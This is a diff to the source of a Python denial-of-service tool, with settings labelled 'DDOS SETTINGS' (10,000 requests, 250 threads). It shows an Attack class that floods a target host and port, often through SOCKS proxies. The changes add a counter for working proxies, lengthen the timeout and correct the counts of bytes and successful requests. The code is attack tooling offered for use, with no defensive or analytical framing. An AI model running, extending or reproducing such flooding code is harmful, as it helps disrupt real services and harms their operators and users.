@@ -1,7 +1,6 @@
 import time
 import random
 import socket
-from xmlrpc.client import INTERNAL_ERROR
 import socks
 import ssl
 import datetime
@@ -12,7 +11,7 @@ import requests
 #DDOS SETTINGS
 MAX_SIMPLE_CONNECTION_REQUESTS = 10000
 THREAD_COUNT = 250
-TIMEOUT = 1.0                           # secs
+TIMEOUT = 2.0                           # secs
 USE_SOCKS_ONLY = False
 #DDOS SETTINGS
 
@@ -36,6 +35,7 @@ class Stats:
         self.__bytes = 0
         self.__good = 0
         self.__bad = 0
+        self.__good_proxy = 0
         self.__bad_proxy = 0
 
     def add_good(self, cnt = 1):
@@ -64,6 +64,9 @@ class Stats:
     def get_bad(self):
         return self.__bad
 
+    def get_good_proxy(self):
+        return self.__good_proxy
+
     def get_bad_proxy(self):
         return self.__bad_proxy
 
@@ -71,7 +74,7 @@ class Stats:
         return self.__bytes
 
     def get_start_time(self):
-        return self.__start_time.strftime("%m/%d/%Y, %H:%M:%S")
+        return self.__start_time.strftime("%d.%m.%Y, %H:%M:%S")
 
 stats = Stats(datetime.datetime.now())
 class Proxy:
@@ -263,6 +266,7 @@ class Attack:
 
         try:
             s.connect((target.HOST, int(target.PORT)))
+            stats.add_good_proxy()
         except Exception as e:
             s.close()
             stats.add_bad_proxy()
@@ -327,6 +331,7 @@ class Attack:
         s.settimeout(TIMEOUT)
         try:
             s.connect((proxy.IP, int(proxy.PORT)))
+            stats.add_good_proxy()
         except:
             stats.add_bad_proxy()
             return
@@ -345,8 +350,9 @@ class Attack:
                     if not sent:
                         stats.add_bad()
                         # break
-                    stats.add_bytes(len(request))
-                    stats.add_good()
+                    else:
+                        stats.add_bytes(len(request))
+                        stats.add_good()
             s.close()
         except Exception as e:
             stats.add_bad()
